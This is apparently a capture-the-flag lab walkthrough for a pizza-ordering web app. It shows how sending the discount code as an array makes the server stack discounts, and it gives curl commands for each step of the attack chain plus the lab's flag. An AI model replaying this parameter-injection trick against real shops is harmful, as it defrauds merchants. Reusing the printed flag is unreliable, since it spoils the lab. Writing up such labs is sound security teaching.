# Cheesy Does It (Discount) - BugForge Lab Walkthrough

**URL:** https://lab-1781902801780-77y3xq.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Business Logic - Parameter Type Confusion (Array Injection on Discount Field)
**Flag:** `bug{3o2w8Gx16mxuqkVPA60zxv31OlR18i2S}`

---

## Summary

Cheesy Does It is a pizza ordering SPA. A discount code `PIZZA-10` is advertised in the UI for 10% off. The `discount` field in `POST /api/orders` is expected to be a string, but the server accepts an array and iterates each element, applying every entry as a separate discount. Sending the code multiple times in an array stacks the discounts past 100%, triggering the flag.

## Tech Stack

- Frontend: React SPA (CRA)
- Backend: Node.js / Express
- Auth: JWT (HS256, no exp)
- No DB access needed - pure business logic

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | None | Returns JWT immediately on success |
| `POST /api/payment/validate` | JWT | Validates card - always succeeds with test card |
| `POST /api/payment/process` | JWT | `amount` is client-controlled |
| `POST /api/orders` | JWT | `discount` field accepts string or array |
| `GET /api/orders` | JWT | Lists all orders for current user |

## Vulnerability

The JS bundle reveals the checkout flow sends `discount` as a string:

```javascript
const t = { items: e, delivery_address: ..., payment_method: "card", notes: ..., discount: i.discount_code };
await Ro.post("/api/orders", t);
```

The server processes the discount field without a `typeof === 'string'` guard. When an array is passed, it iterates every element and applies each discount separately - bypassing the "one discount per order" constraint. With enough repetitions the cumulative discount exceeds the order total, triggering the flag in the response.

The UI also reveals the code directly in the homepage banner: `"Use the discount code PIZZA-10 for a 10% discount today only!"`.

## Attack Chain

**Step 1 - Register and get JWT**
```bash
TARGET="https://lab-1781902801780-77y3xq.labs-app.bugforge.io"

TOKEN=$(curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker1","email":"attacker1@evil.com","password":"Password123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Step 2 - Validate payment**
```bash
curl -s -X POST $TARGET/api/payment/validate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"4444 4444 4444 4444","exp_month":"12","exp_year":"25","cvv":"123"}'
# {"valid":true,"message":"Card validated successfully"}
```

**Step 3 - Process payment**
```bash
curl -s -X POST $TARGET/api/payment/process \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"card_number":"4444 4444 4444 4444","amount":10.99}'
# {"success":true,"transaction_id":"TXN-..."}
```

**Step 4 - Place order with array discount (stacked)**

Item structure uses name strings (not IDs), matching what the React cart stores:
```bash
curl -s -X POST $TARGET/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{
      "name": "Classic Margherita",
      "base_name": "Thin Crust",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "toppings": ["Tomatoes", "Extra Mozzarella"],
      "quantity": 1,
      "unit_price": 10.99,
      "total_price": 10.99
    }],
    "delivery_address": "123 Test St",
    "phone": "1234567890",
    "payment_method": "card",
    "notes": "",
    "discount": ["PIZZA-10","PIZZA-10"]
  }'
# Flag in response body
```

Two repetitions of PIZZA-10 (20% total) is sufficient to trigger the flag.

## Discovery Notes

- Homepage JS bundle contained the discount code in plaintext in the UI string: `"PIZZA-10"`.
- JS bundle showed `discount_code` field sent as a string from the form, but nothing server-side prevents it being sent as an array.
- `GET /api/orders` after early array attempts showed `total_price: "NaN"` - confirmed the server was iterating the array but failing on math when items were malformed.

## Dead Ends

| Tried | Why It Failed | Lesson |
|---|---|---|
| `pizza_id`/`base_id` integer fields in items | Server expects name strings matching cart structure | Read JS bundle for exact cart item shape before sending orders |
| `"discount":"PIZZA-10,PIZZA-10"` comma string | Server treats it as a single unknown code | Array notation only - string variants are rejected |

## Root Cause

The order handler accepts `req.body.discount` without validating `typeof discount === 'string'`. When the value is an array, a `for...of` or `.forEach` loop applies each element as a discount, stacking them. Any field with a "one per X" constraint that is not type-checked is vulnerable to the same pattern.

## CWE / OWASP

- CWE-20: Improper Input Validation (type not checked)
- CWE-840: Business Logic Errors
- OWASP A04:2021 - Insecure Design
